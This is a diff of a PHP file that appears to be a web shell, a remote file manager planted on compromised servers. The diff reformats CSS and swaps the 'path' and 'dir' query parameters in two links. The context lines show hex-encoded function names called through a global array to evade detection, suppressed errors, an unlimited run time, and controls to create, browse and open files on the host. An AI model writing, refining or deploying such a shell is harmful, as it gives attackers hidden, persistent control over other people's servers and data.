@@ -4,7 +4,6 @@ ob_start();set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', FALSE);
 $Array = [
-
 // $GLOBALS['fungsi'][0]
 	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
 	'69735f646972', // i s _ d i r => 1
@@ -296,13 +295,10 @@ $Array = [
 		<script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
         <style>
 			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
-			*
-			{
-			font-family: 'Poppins', sans-serif;
-			font-weight: 400;
+			*{
+				font-family: 'Poppins', sans-serif;
+				font-weight: 400;
 			}
-        </style>
-        <style>
             gr {
                 color: green;
             }
@@ -1341,7 +1337,7 @@ $Array = [
 		</thead>
 		<tbody class="text-nowrap">
 		<tr>
-			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
+			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?dir='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
 				<div class="btn-group">
 					<a class="btn btn-outline-light btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
 					<a class="btn btn-outline-light btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
@@ -1422,7 +1418,7 @@ $Array = [
 			}
 		echo "
 		<tr>
-		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
+		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?path=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
 			<td class='text-center'>file</td>
 			<td class='text-center'>$ft</td>
 			<td class='text-center'>".sz(filesize($file))."</td>
